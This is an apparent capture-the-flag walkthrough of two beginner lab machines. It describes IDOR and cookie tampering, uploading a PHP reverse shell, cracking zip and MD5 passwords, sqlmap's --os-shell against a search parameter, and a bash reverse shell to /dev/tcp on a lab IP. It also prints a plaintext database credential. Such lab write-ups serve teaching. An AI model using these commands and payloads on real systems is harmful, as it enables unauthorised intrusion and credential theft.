![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/59839b59-15ea-429e-94e8-63090e1b6e7a)

This what we will do today :)
1. With what kind of tool can intercept web traffic? 
This will be just: proxy

2. What is the path to the directory on the webserver that returns a login page? 
For this kind of enumeration i recomend to use: feroxbuster, but in this lab this doesn't work. I turn on the BurpSuite and also proxy, refresh the page and traffic some packiet, there was /cdn-cgi i insert this in ffuf and i got the /cdn-cgi/login, this is answer for the question.

3. What can be modified in Firefox to get access to the upload page? 
This will be a: cookie 

4. What is the access ID of the admin user? 
Here we need to find the IDOR, i log in as a guest, and there we can see on the navbar, account i go there and in the URL you can see something intresting http://10.129.213.188/cdn-cgi/login/admin.php?content=accounts&id=2 i tryed change this from 2 to 1 and i got the Cookie-user: 34322

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/c8690ed3-953e-4c4b-b63c-8cbb4ba4b17c)

5. On uploading a file, what directory does that file appear in on the server? 
Again i used ffuf to do some recon, to find the directory, after few secend i did it, here's the results:
This will be /uploads

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/06067e2c-e923-4675-9630-ee955d15f16c)

6. What is the file that contains the password that is shared with the robert user? 
We need to step back little bit, the target is upload the reverse-shell, first what i did is turn on the burp and intercept the traffic. Then change the in Cookie=user: 2233 role=guest to, Cookie=user: 34322 role=admin, you will get access as a admin, then cp on your computer the reverse-shell ~by this command: cp /usr/share/webshells/php/php-reverse-shell.php ~

You need to open with nano or vim, and change this paramiter: $ip, on your own ip.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/0e210008-ffd0-4c87-8d24-74181ad3cdb6)

If u change, let's go upload this RCE :P, but rember to change the Cookie=user:, role= without this u can't upload file on the server. If u did this, you can see the announcement  The file php-reverse-shell.php has been uploaded. 
No go to the /uploads, before that rember to turn on the netcat -lvnp 1234 to get a RCE. Something was wrong, i tryed to go /uploads be only what i can see is Forbidden, then /uploads/php-reverse-shell.php but still nothing, i tryed again upload this RCE and i got this :P
Rember to google better shell python and insert in your shell: python3 -c 'import pty; pty.spawn("/bin/bash")'

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/1b600a43-7e46-43fc-acd8-94412accdd5b)

7. What is the file that contains the password that is shared with the robert user? 
I don't did any recon, i got the RCE and there i foud this, the file that contains the password is db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

8. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 
The answer is: find

9. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? 
The answer is: root, you can check this by command ls -la

10. What SUID stands for? 
This we need to google, because i have no idea what can mean this acronym:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/ec4ca946-f826-44c3-a21f-2a687ab2dac1)

11. What is the name of the executable being called in an insecure manner? 
I analyz the Provide Bug ID: and there only 3, but when i insert 4, i can see this: cat: /root/reports/4: No such file or directory, now we know script read the file only, now we need to figure out how we can use this to get access by root.

12. Submit user flag 
By before this, here's the user.txt ![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/ddf8e1d3-2577-40c8-9fa1-bfc4acd060a4)

13. Submit root flag
Here's the way how you can exploit it.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/20ee9bff-d43a-42bb-92cf-e823d0eb0b7a)

And now u have a access as root.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/20cf4eda-d02b-4088-a4a5-dc36f5848f65)
![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/9b0e178d-9c91-4994-a0c0-7a5bd8620dd6)


The next lab:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/0cce350a-6377-44b4-9827-26b64dfa8fad)

1. Besides SSH and HTTP, what other service is hosted on this box?
I did a scan
There no many port's only 3, SSH, HTTP, FTP. But you can see, we can log in as Anonymous to FTP.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/c115a783-7036-4319-b81f-49c523403107)

2. This service can be configured to allow login with any password for specific username. What is that username? 
We can see on the scan, the answer is Anonymous

3. What is the name of the file downloaded over this service?
After when we log in,in to FTP we can see there: backup.zip

4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? 
First we need to use zip2john tool: zip2john backup.zip > hash.txt, then u need to use john to crack the hash by command, john -w=/usr/share/wordlist/rockyou.txt hash.txt and u will get the password: 741852963, then you need to unzip backup.zip and insert the password you will get 2 files. index.php, style.css 

5. What is the password for the admin user on the website? 
We need to read the code in file index.php, there we can see the password for admin.
But how can see in this code md5($_POST['password']), this is encode in MD5, we need to decode this pasword, i used crackstation and i got the passowrd:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/fa51c08a-9772-42cf-9d8b-1899faca10be)
![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/bb7f8ea2-ef54-4ef6-8834-ba29852738fc)

6.What option can be passed to sqlmap to try to get command execution via the sql injection? 
We need to check the sqlmap -h, there i found the switch to get command execution
```
Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
```

7. What program can the postgres user run as root using sudo? 
First we need to do RCE, insert in your terminal: 
```
sqlmap -u "http://10.129.228.13/dashboard.php?search=any+query" --cookie="PHPSESSID=2feacs4fsqv5ag51igr7nvf7q6" --os-shell
```
This will help us to get a RCE, then turn on the netcat: nc -lvnp 4444
And your sqlmap will a message will appear
Like this:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/a08961fb-c0c8-4e6f-9c81-aebbb08b41b9)

You need to insert there: bash -c "bash -i >& /dev/tcp/10.10.16.21/4444 0>&1"
But rember change the ip, also in this reverse-shell like in command sqlmap, if you don't change the ip and --cookie u don't get access, you can find your cookie by press right click on your mouse inspect, then go to network there it is.
But when you change everything you can see this:

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/157f16da-4ae7-4301-961c-5fb95cab94e4)
